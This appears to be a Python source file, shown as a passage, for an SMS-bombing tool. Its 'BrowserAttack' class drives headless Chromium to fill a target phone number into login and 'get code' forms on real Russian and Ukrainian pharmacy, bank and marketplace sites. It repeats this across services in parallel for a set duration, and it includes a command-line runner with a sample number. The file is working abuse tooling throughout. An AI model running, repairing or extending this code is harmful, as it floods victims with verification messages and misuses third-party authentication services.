            "yandex", "metrika", "mc.yandex.ru", "googletagmanager", "google-analytics",
            "mail.ru", "vk.com"
        )):
            await route.continue_()
            return

        if any(tracker in url for tracker in _BLOCKED_TRACKERS):
            await route.abort()
            return

        if res_type in ("media", "font"):
            await route.abort()
            return

        if res_type == "image":
            if (
                ".svg" in url
                or url.startswith("data:")
                or any(k in url for k in ("icon", "logo", "btn", "button", "arrow", "check", "eye", "sign", "login"))
            ):
                await route.continue_()
                return
            await route.abort()
            return

        await route.continue_()
    except Exception:
        try:
            await route.continue_()
        except Exception:
            pass

async def _apply_route_filter(context: BrowserContext) -> None:
    try:
        await context.route("**/*", _route_filter)
    except Exception as exc:
        logger.debug("failed to apply route filter: %r", exc)

class BrowserRunner:
    def __init__(
        self,
        *,
        proxy: str = "",
        proxy_provider: Any = None,
        proxy_reporter: Any = None,
        pool: Any = None,
        timeout: float = 25.0,
        parallel: int = 1,
        headless: bool = True,
    ) -> None:
        self.proxy = proxy
        self.proxy_provider = proxy_provider
        self.proxy_reporter = proxy_reporter
        self.pool = pool
        self._fixed_proxy = _proxy_config(proxy)
        self.timeout = max(1.0, float(timeout))
        self.parallel = max(1, int(parallel))
        self.headless = headless
        self._playwright: Playwright | None = None
        self._browser: Browser | None = None
        self._slots = asyncio.Semaphore(self.parallel)
        self._lock = asyncio.Lock()
        self._closed = False

    def available(self) -> list[str]:
        return sorted(SERVICES)

    async def run(self, name: str, digits: str) -> bool:
        flow = SERVICES.get(name)
        if flow is None:
            raise BrowserError(f"нет сервиса {name!r} в browser.py")
        await self.start()
        async with self._slots:
            context = await self._new_context()
            try:
                page = await context.new_page()
                page.set_default_timeout(int(self.timeout * 1000))
                ok = bool(await asyncio.wait_for(flow(page, digits), self.timeout))
            except asyncio.TimeoutError as exc:
                raise BrowserError(
                    f"сценарий {name} не уложился в {self.timeout:.0f}с") from exc
            finally:
                try:
                    await context.close()
                except Exception:
                    logger.debug("context close failed", exc_info=True)
            return ok

    def _report(self, proxy: Any, ok: bool) -> None:
        pass

    async def start(self) -> None:
        browser = self._browser
        if browser is not None and browser.is_connected():
            return
        if self._closed:
            raise BrowserError("браузер остановлен")
        async with self._lock:
            if self._browser is not None:
                if self._browser.is_connected():
                    return
                logger.warning("browser disconnected, restarting")
                await self._teardown()
            try:
                playwright = await async_playwright().start()
            except Exception as exc:
                raise BrowserError(f"playwright не запустился: {exc}") from exc
            try:
                browser = await playwright.chromium.launch(
                    headless=self.headless,
                    args=_LAUNCH_ARGS,
                )
            except Exception as exc:
                try:
                    await playwright.stop()
                except Exception:
                    logger.debug("playwright stop failed", exc_info=True)
                raise BrowserError(f"браузер не запустился: {exc}") from exc
            self._playwright = playwright
            self._browser = browser

    async def _teardown(self) -> None:
        browser, playwright = self._browser, self._playwright
        self._browser = None
        self._playwright = None
        if browser is not None:
            try:
                await browser.close()
            except Exception:
                logger.debug("browser close failed", exc_info=True)
        if playwright is not None:
            try:
                await playwright.stop()
            except Exception:
                logger.debug("playwright stop failed", exc_info=True)

    async def close(self) -> None:
        self._closed = True
        await self._teardown()

    async def _new_context(self, proxy: Any = None) -> BrowserContext:
        if self._browser is None:
            raise BrowserError("браузер не запущен")
        ctx = await self._browser.new_context(
            user_agent=DEFAULT_USER_AGENT,
            locale=locale,
            timezone_id=timezone,
            viewport=viewport,
            ignore_https_errors=True,
            proxy=None,
        )
        await _apply_route_filter(ctx)
        return ctx

class BrowserAttack:

    MAX_SERVICES_PER_BROWSER = 30

    def __init__(
        self,
        phone: str,
        duration: int,
        *,
        services: list[Any] | None = None,
        workers: int = 4,
        timeout: float = 15.0,
        proxy: str = "",
        pool: Any = None,
        control: Channel | None = None,
        context_rotation: int = 20,
        delay: float = 0.5,
    ) -> None:
        self.phone = phone
        self.duration = max(1, int(duration))
        self.country = ""
        if services is not None:
            self.services = list(services)
            try:
                _digits, country = parse_phone(self.phone)
                self.country = country
            except Exception:
                pass
        else:
            try:
                _digits, country = parse_phone(self.phone)
                self.country = country
                self.services = [
                    fn for name, fn in SERVICES.items()
                    if SERVICE_COUNTRIES.get(name) == country
                ]
            except Exception:
                self.services = []
        self.workers = max(1, int(workers))
        self.parallel = min(self.MAX_SERVICES_PER_BROWSER, self.workers)
        self.timeout = max(5.0, float(timeout))
        self.proxy = ""
        self.pool = None
        self.control = control
        self.context_rotation = max(1, int(context_rotation))
        self.delay = max(0.0, float(delay))

        self.started_at = 0.0
        self.deadline = 0.0
        self.user_stopped = False

        self._stop = asyncio.Event()
        self._done = asyncio.Event()
        self._tasks: list[asyncio.Task] = []
        self._pages: set[Any] = set()
        self._runner: asyncio.Task | None = None
        self._playwright: Any = None
        self._browser: Any = None
        self._contexts: dict[Any, Any] = {}
        self._attempts_per_worker: dict[int, int] = {}

        self._sent = 0
        self._ok = 0
        self._err = 0
        self._unconfirmed = 0
        self.failures: dict[str, int] = {}
        self.statuses: dict[int, int] = {}
        self.by_service: dict[str, dict[int, int]] = {}

    @property
    def running(self) -> bool:
        return not self._done.is_set()

    def start(self, deadline: float | None = None) -> "BrowserAttack":
        self.started_at = time.monotonic()
        self.deadline = deadline if deadline else self.started_at + self.duration
        self._runner = asyncio.create_task(
            self._run(), name=f"browser-{id(self):x}")
        return self

    def stop(self, by_user: bool = True) -> None:
        self.user_stopped = self.user_stopped or by_user
        self._stop.set()
        for task in self._tasks:
            if not task.done():
                task.cancel()

    async def wait(self) -> None:
        if self._runner is None:
            return
        await self._done.wait()

    async def aclose(self) -> None:
        self.stop(by_user=False)
        await self.wait()
        await self._close_browser()

    def snapshot(self) -> dict:
        return {
            "sent": self._sent,
            "ok": self._ok,
            "err": self._err,
            "unconfirmed": self._unconfirmed,
            "running": self.running,
            "failures": dict(self.failures),
            "statuses": dict(self.statuses),
            "by_service": {name: dict(counts) for name, counts in self.by_service.items()},
        }

    def _note(self, service: str, confirmed: bool) -> None:
        status = 200
        self._sent += 1
        self.statuses[status] = self.statuses.get(status, 0) + 1
        counts = self.by_service.setdefault(service, {})
        counts[status] = counts.get(status, 0) + 1
        if confirmed:
            self._ok += 1
        else:
            self._unconfirmed += 1
        if self.control is not None:
            self.control.note_request(status, service, accepted=confirmed)

    def _fail(self, service: str, kind: str) -> None:
        self._err += 1
        label = f"{service}:{kind}"
        self.failures[label] = self.failures.get(label, 0) + 1
        if self.control is not None:
            self.control.note_error(label)

    async def _run(self) -> None:
        watchdog = asyncio.create_task(
            self._watchdog(), name="browser-deadline")
        try:
            if not self.services or self._stop.is_set() or time.monotonic() >= self.deadline:
                return

            service_idx = 0
            total_services = len(self.services)

            while not self._stop.is_set() and time.monotonic() < self.deadline:
                batch = []
                for _ in range(self.MAX_SERVICES_PER_BROWSER):
                    if self._stop.is_set() or time.monotonic() >= self.deadline:
                        break
                    batch.append(self.services[service_idx % total_services])
                    service_idx += 1

                if not batch:
                    break

                if not await self._run_session(batch):
                    return
        except asyncio.CancelledError:
            raise
        except Exception:
            logger.exception("browser attack: runner crashed")
        finally:
            watchdog.cancel()
            await asyncio.gather(watchdog, return_exceptions=True)
            try:
                await self._close_browser()
            finally:
                self._done.set()

    async def _watchdog(self) -> None:
        try:
            remaining = self.deadline - time.monotonic()
            if remaining > 0:
                await asyncio.sleep(remaining)
            self.stop(by_user=False)
        except asyncio.CancelledError:
            pass

    async def _run_session(self, batch: list[Any]) -> bool:
        if not await self._ensure_browser():
            return False

        queue: asyncio.Queue[Any] = asyncio.Queue()
        for svc in batch:
            queue.put_nowait(svc)

        concurrency = max(1, min(self.parallel, len(batch)))

        async def worker(worker_id: int) -> None:
            while not self._stop.is_set() and time.monotonic() < self.deadline:
                try:
                    svc = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                try:
                    await self._process_service(worker_id, svc)
                except asyncio.CancelledError:
                    if self._stop.is_set():
                        queue.task_done()
                        break
                    raise
                except Exception as exc:
                    logger.debug(
                        "worker %d: service crashed: %r", worker_id, exc)
                finally:
                    queue.task_done()

        tasks = [
            asyncio.create_task(worker(i), name=f"browser-worker-{i}")
            for i in range(concurrency)
        ]
        self._tasks = list(tasks)

        try:
            join_task = asyncio.create_task(queue.join())
            stop_task = asyncio.create_task(self._stop.wait())
            try:
                done, pending = await asyncio.wait(
                    [join_task, stop_task],
                    return_when=asyncio.FIRST_COMPLETED,
                )
            finally:
                for t in (join_task, stop_task):
                    if not t.done():
                        t.cancel()
                await asyncio.gather(join_task, stop_task, return_exceptions=True)
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self._tasks = []
            await self._close_browser()

        return True

    _run_batch = _run_session

    async def _process_service(self, index: int, service: Any) -> None:
        if self._stop.is_set() or time.monotonic() >= self.deadline:
            return

        svc_name = _service_name(service)
        if self.control is not None:
            try:
                allowed = await self.control.acquire_rate()
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.debug(
                    "browser %s: rate limiter failed: %r", svc_name, exc)
                allowed = False
            if not allowed:
                self._stop.set()
                return
            if self._stop.is_set() or time.monotonic() >= self.deadline:
                return

        page = None
        ctx = None
        try:
            page = await self._new_page(index)
            self._pages.add(page)
            ctx = getattr(page, "context", None)
            confirmed = await asyncio.wait_for(
                _invoke_service(service, page, dial(self.phone)),
                timeout=self.timeout + 15.0,
            )
            self._note(svc_name, confirmed)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self._fail(svc_name, type(exc).__name__)
            logger.debug("browser %s: %r", svc_name, exc)
        finally:
            if page is not None:
                self._pages.discard(page)
                try:
                    await page.close()
                except Exception:
                    pass
            if ctx is not None:
                if isinstance(self._contexts, dict):
                    self._contexts.pop(id(ctx), None)
                elif isinstance(self._contexts, set):
                    self._contexts.discard(ctx)
                try:
                    await ctx.close()
                except Exception:
                    pass
            page = None
            ctx = None

        await self._pause(self.delay)

    async def _pause(self, seconds: float) -> None:
        if seconds <= 0 or self._stop.is_set():
            return
        try:
            await asyncio.wait_for(self._stop.wait(), timeout=seconds)
        except asyncio.TimeoutError:
            pass

    async def _ensure_browser(self) -> bool:
        if self._browser is not None:
            try:
                if self._browser.is_connected():
                    return True
            except Exception:
                pass
            await self._close_browser()

        try:
            self._playwright = await async_playwright().start()
        except Exception as exc:
            logger.warning("browser attack: playwright start failed: %r", exc)
            return False

        try:
            self._browser = await self._playwright.chromium.launch(
                headless=True,
                args=_LAUNCH_ARGS,
            )
            logger.info(
                "browser attack up: single instance active, pool parallel=%d, restart threshold=%d",
                self.parallel,
                self.MAX_SERVICES_PER_BROWSER,
            )
            return True
        except Exception as exc:
            logger.warning("browser attack: launch failed: %r", exc)
            await self._close_browser()
            return False

    async def _new_context(self) -> BrowserContext:
        if self._browser is None:
            raise BrowserError("браузер не запущен")
        ctx = await self._browser.new_context(
            user_agent=DEFAULT_USER_AGENT,
            locale=locale,
            timezone_id=timezone,
            viewport=viewport,
            device_scale_factor=1,
            has_touch=False,
            is_mobile=False,
            ignore_https_errors=True,
            proxy=None,
        )
        await _apply_route_filter(ctx)
        self._contexts[id(ctx)] = ctx
        return ctx

    async def _new_page(self, index: int = 0) -> Any:
        ctx = await self._new_context()
        page = await ctx.new_page()
        page.set_default_timeout(int(self.timeout * 1000))
        page.set_default_navigation_timeout(int(self.timeout * 1000))
        return page

    async def _drop_context(self) -> None:
        for idx in list(self._contexts):
            ctx = self._contexts.pop(idx, None)
            if ctx is not None:
                try:
                    await ctx.close()
                except Exception:
                    pass
        self._attempts_per_worker.clear()

    async def _close_browser(self) -> None:
        for page in list(self._pages):
            self._pages.discard(page)
            try:
                await page.close()
            except Exception:
                pass
        await self._drop_context()
        if self._browser is not None:
            try:
                await self._browser.close()
            except Exception:
                pass
            self._browser = None
        if self._playwright is not None:
            try:
                await self._playwright.stop()
            except Exception:
                pass
            self._playwright = None
        import gc
        gc.collect()

async def _manual(phone: str = "79373801861", service_name: str | None = None) -> None:
    args = sys.argv[1:]
    if "--help" in args or "-h" in args:
        print("Использование: python browser.py [НОМЕР] [СЕРВИСЫ]")
        print("Примеры:")
        print("  python browser.py 79373801861")
        print("  python browser.py 79373801861 rabotavdodo")
        print("  python browser.py 79373801861 rabotavdodo,tbank,finuslugi,raiffaisen")
        print(
            f"Доступные сервисы ({len(SERVICES)}): {', '.join(sorted(SERVICES.keys()))}")
        return

    if "--list" in args:
        print(f"Зарегистрировано сервисов: {len(SERVICES)}")
        for s_name in sorted(SERVICES.keys()):
            cntry = SERVICE_COUNTRIES.get(s_name, "ALL")
            print(f"  • {s_name:<15} [{cntry}]")
        return

    if args and not args[0].startswith("-"):
        phone = args[0]
        if len(args) > 1 and not args[1].startswith("-"):
            service_name = args[1]

    digits, country = parse_phone(phone)
    headless = os.environ.get(
        "HEADLESS", "true").lower() in ("1", "true", "yes")
    proxy_val = os.environ.get("BROWSER_PROXY", "").strip()
    proxy_cfg = _proxy_config(proxy_val) if proxy_val else None

    if service_name:
        wanted = [s.strip().lower()
                  for s in service_name.split(",") if s.strip()]
        targets = {name: fn for name,
                   fn in SERVICES.items() if name.lower() in wanted}
        if not targets:
            print(f"Ошибка: сервис(ы) {service_name!r} не найдены.")
            print(f"Доступные сервисы: {', '.join(sorted(SERVICES.keys()))}")
            return
    else:
        targets = {name: fn for name, fn in SERVICES.items(
        ) if SERVICE_COUNTRIES.get(name) == country}
        if not targets:
            targets = dict(SERVICES)

    print(
        f"Запуск {len(targets)} сервисов для {phone} (страна: {country}, прямое подключение)...")
    print(f"Список сервисов: {', '.join(targets.keys())}")

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=headless,
            args=_LAUNCH_ARGS,
        )
        context = await browser.new_context(
            user_agent=DEFAULT_USER_AGENT,
            locale=locale,
            timezone_id=timezone,
            viewport=viewport,
            ignore_https_errors=True,
            proxy=None,
        )
        try:
            for name, flow in targets.items():
                page = await context.new_page()
                page.set_default_timeout(20_000)
                try:
                    confirmed = await asyncio.wait_for(flow(page, digits), timeout=60.0)
                    print(f"[{name}] confirmed={confirmed}")
                except asyncio.TimeoutError:
                    print(f"[{name}] error: общий таймаут выполнения (60с)")
                except Exception as exc:
                    print(f"[{name}] error: {exc}")
                finally:
                    await page.close()
        finally:
            await context.close()
            await browser.close()

@service("eapteka_ru", country="RU")
async def eapteka_ru(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+7")
    await page.goto("https://eapteka.ru", wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        (
            'input[type="tel"]',
            'input[type="tel"]',
            'input[name*="phone"]',
        ),
        timeout=8.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    btn = await first_visible(
        page,
        (
            'button[type="submit"]',
            'button:has-text("Войти")',
            'button:has-text("Получить код")',
        ),
        timeout=4.0,
    )
    if btn is not None:
        await btn.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("gorzdrav_org", country="RU")
async def gorzdrav_org(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+7")
    await page.goto("https://gorzdrav.org", wait_until="commit", timeout=12000)
    field = await first_visible(
        page,
        (
            'input[type="tel"]',
            'input[type="tel"]',
            'input[name*="phone"]',
        ),
        timeout=8.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(500)
    btn = await first_visible(
        page,
        (
            'button[type="submit"]',
            'button:has-text("Войти")',
            'button:has-text("Получить код")',
        ),
        timeout=4.0,
    )
    if btn is not None:
        await btn.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("privat24_ua", country="UA")
async def privat24_ua(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://www.privat24.ua/", wait_until="domcontentloaded", timeout=20000)
    field = await first_visible(
        page,
        (
            "input[type=\"tel\"]",
            'input[type="tel"]',
            'input[name*="phone" i]',
        ),
        timeout=10.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(400)
    button = await first_visible(
        page,
        (
            "button[type=\"submit\"]",
            'button:has-text("Получить код")',
            'button:has-text("Войти")',
            'button[type="submit"]',
        ),
        timeout=6.0,
    )
    if button is not None:
        await button.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("privat24_privatbank_ua", country="UA")
async def privat24_privatbank_ua(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://privat24.privatbank.ua/p24/web/", wait_until="domcontentloaded", timeout=20000)
    field = await first_visible(
        page,
        (
            "input[type=\"tel\"]",
            'input[type="tel"]',
            'input[name*="phone" i]',
        ),
        timeout=10.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(400)
    button = await first_visible(
        page,
        (
            "button[type=\"submit\"]",
            'button:has-text("Получить код")',
            'button:has-text("Войти")',
            'button[type="submit"]',
        ),
        timeout=6.0,
    )
    if button is not None:
        await button.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("edu_sravni_ru", country="RU")
async def edu_sravni_ru(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+7")
    await page.goto("https://edu.sravni.ru/kursy/", wait_until="domcontentloaded", timeout=20000)
    field = await first_visible(
        page,
        (
            "input[name*=\"phone\" i]",
            'input[type="tel"]',
            'input[name*="phone" i]',
        ),
        timeout=10.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(400)
    button = await first_visible(
        page,
        (
            "button:has-text(\"\u0412\u043e\u0439\u0442\u0438\")",
            'button:has-text("Получить код")',
            'button:has-text("Войти")',
            'button[type="submit"]',
        ),
        timeout=6.0,
    )
    if button is not None:
        await button.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("platformamarket_com_ua", country="UA")
async def platformamarket_com_ua(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://platformamarket.com.ua/seller/login", wait_until="domcontentloaded", timeout=20000)
    field = await first_visible(
        page,
        (
            "input[type=\"tel\"]",
            'input[type="tel"]',
            'input[name*="phone" i]',
        ),
        timeout=10.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(400)
    button = await first_visible(
        page,
        (
            "button[type=\"submit\"]",
            'button:has-text("Получить код")',
            'button:has-text("Войти")',
            'button[type="submit"]',
        ),
        timeout=6.0,
    )
    if button is not None:
        await button.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

@service("serviceinua_com", country="UA")
async def serviceinua_com(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://serviceinua.com/uk/glavnaya_ua/", wait_until="domcontentloaded", timeout=20000)
    field = await first_visible(
        page,
        (
            "input[name*=\"phone\" i]",
            'input[type="tel"]',
            'input[name*="phone" i]',
        ),
        timeout=10.0,
    )
    if field is None:
        return False
    await field.fill(phone_fmt)
    await page.wait_for_timeout(400)
    button = await first_visible(
        page,
        (
            "button[type=\"submit\"]",
            'button:has-text("Получить код")',
            'button:has-text("Войти")',
            'button[type="submit"]',
        ),
        timeout=6.0,
    )
    if button is not None:
        await button.click()
    else:
        await page.keyboard.press("Enter")
    await page.wait_for_timeout(2000)
    return True

if __name__ == "__main__":
    asyncio.run(_manual())
